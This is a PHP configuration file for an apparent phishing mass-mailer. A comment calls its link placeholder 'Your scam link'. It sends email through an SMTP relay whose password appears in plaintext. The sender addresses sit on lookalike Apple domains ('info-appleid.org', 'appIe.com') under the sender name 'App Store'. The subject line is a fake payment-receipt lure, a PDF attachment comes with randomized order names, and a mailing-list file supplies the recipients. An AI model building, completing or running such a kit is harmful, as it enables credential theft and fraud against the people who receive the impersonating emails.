<?php

$random = rand(999999,9999999);
$ListBrowser = array(
    "Internet Explorer",
    "Firefox",
    "Safari",
    "Chrome",
    "Edge",
    "Opera",
    "Netscape"
);
shuffle($ListBrowser);
$browser = array_shift($ListBrowser);
$List = array(
    "Attach-ID",
    "Doc.Attach",
    "File-ID",
    "Steps"
);
shuffle($List);
$xpdf = array_shift($List);

$FM = array(
    "letid",
    "servid",
    "letsid",
    "tlsecurid",
);
shuffle($FM);
$xfm = array_shift($FM);


require "function/user.php";

//-------------Random (Letter)-----------------//
// [short]          = Your scam link
// [randstring+]    = Uppercase random string
// [randstring-]    = Lowercase random string
// [randstring=]    = Mixcase random string
// [country]        = Random country
// [date]           = Random date
// [OS]             = Random OS
// [browser]        = Random Browser
// [number]         = Random Number
// [ip]             = Random IP
//------------Random (From Mail)---------------//
// [randstring+]    = Uppercase random string
// [randstring-]    = Lowercase random string
// [randstring=]    = Mixcase random string
// [number]         = Random Number
// [default]        = Random 16 Digit String
//----------------Config---------------------//

$usesmtpgen         = "1";  // 0 [manual create user_relay], 1 [use generated user relay]
$usehtml            = "2";  // 0 [null letter], 1 [html letter], 2 [plain letter]
$mode               = "bcc"; // bcc [BCC], cc [CC]
$token              = "MEMEK_COK"; // Only for 1 month
$debug              = "1";  // 0 [Show only total email send], 1 [Show full email send]
$from_mail          = "[randstring-]eeleks.17t[number]";

$bstrd              = [ "host"  => "smtp-relay.gmail.com",
                        "port"  => "587",
                        "pass"  => "Admur04012000",
                      ];

$user_relay         = [
                        "admin@info-appleid.org",
                        "noreply@info-appleid.org",
                      ];

$mails              = [
                        "subj"      => "RE : 【 Payment Statement Update 】 Thank You ! Your order 'Tomb Rider' [2018] Has been Processed, Renewal of Payment is Active. Mail [randstring=] / Gracias ! Su pedido 'Tomb Rider' [2018] ha sido procesado, la renovación del pago está activa. Mail [randstring=]...",
                        "attached"  => "attach/hepeng.pdf",
                        "bcc"       => "appleInformatIon@appIe.com",
                        "fromname"  => "App Store",
                        "letter"    => "letter/blank.html",
                        "plain"     => "Support id, #[randstring=] - [ 29 March 2019 ]",
                        "file_name" => "Order-Document#".$random.".pdf",
                        "list"      => "list/mailist.txt",
                        "short"     => "https://www.google.com",
                     ];
?>